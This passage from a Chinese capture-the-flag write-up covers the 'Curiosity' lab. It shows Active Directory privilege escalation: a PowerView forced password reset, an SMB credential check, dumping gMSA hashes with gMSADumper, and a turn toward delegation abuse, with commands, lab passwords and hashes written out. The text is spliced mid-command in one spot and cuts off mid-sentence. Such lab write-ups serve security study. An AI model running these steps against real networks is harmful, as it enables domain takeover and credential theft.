.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ejdoe\u003c/code\u003e 用户信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e拥有强制修改\u003ccode\u003eDBA_ADM\u003c/code\u003e 的权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e横向移动\u003c/h2\u003e\n\u003ch3\u003eTo DBA_ADM\u003c/h3\u003e\n\u003cp\u003e通过 \u003ccode\u003ebloodyAD\u003c/code\u003e 来修改其密码，失败了 ❌\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们远程上去通过 \u003ccode\u003ePowerShell\u003c/code\u003e 改\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$SecPassword\u003c/span\u003e = ConvertTo-SecureString \u003cspan class=\"hljs-string\"\u003e'$pr1ng@'\u003c/span\u003e -AsPlainText -Force\n\u003cspan class=\"hljs-variable\"\u003e$Cred\u003c/span\u003e = New-Object System.Management.Automation.PSCredential(\u003cspan class=\"hljs-string\"\u003e'HACKME\\jdoe'\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$SecPassword\u003c/span\u003e)\n\u003cspan class=\"hljs-variable\"\u003e$UserPassword\u003c/span\u003e = ConvertTo-SecureString \u003cspan class=\"hljs-string\"\u003e'Password123!'\u003c/span\u003e -AsPlainText -Force\n. ./PowerView.ps1\nSet-DomainUserPassword -Identity DBA_ADM -AccountPassword \u003cspan class=\"hljs-variable\"\u003e$UserPassword\u003c/span\u003e -Credential \u003cspan class=\"hljs-variable\"\u003e$Cred\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eTo sqlsvc\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/ hl -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'P@ssword1234!'\u003c/span\u003e\nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\sqlsvc:P@ssword1234! \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo GMSA_SVC$\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSQLSVC\u003c/code\u003e 账户可以读取 \u003ccode\u003eGMAS\u003c/code\u003e 密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003egMSA\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  gMSADumper python gMSADumper.py -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'P@ssword1234!'\u003c/span\u003e -d hackme.thl\nUsers or \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewho\u003c/span\u003e can \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GMSA_SVC$:\n \u003e GMSA_USERS\nGMSA_SVC$:::e1eef5023c307890fdbb047e6554cfd0\nGMSA_SVC$:aes256-cts-hmac-sha1-96:b6ec5a8b9a8b6053167b86b1ef724f3af27c3de4286a59a6bfcb293a37740b66\nGMSA_SVC$:aes128-cts-hmac-sha1-96:a6dc7233da4a2d54e340bb0131d9d921\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo Administrator\u003c/h3\u003e\n\u003cp\u003e我们寻找路径，发现\u003ccode\u003eGMSA_SVC$\u003c/code\u003e 对 \u003ccode\u003eDC\u003c/code\u003e 有 \u003ccode\u003eAllowToAct\u003c/code\u003e 权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAllowToAct\u003c/code\u003e 就是 \u003ccode\u003eAllowedToActOnBehalfOfOtherIdentity\u003c/code\u003e ，\u003ccode\u003eGMSA_SVC\u003c/code\u003e 已添加到 \u003ccode\u003eDC.HACK
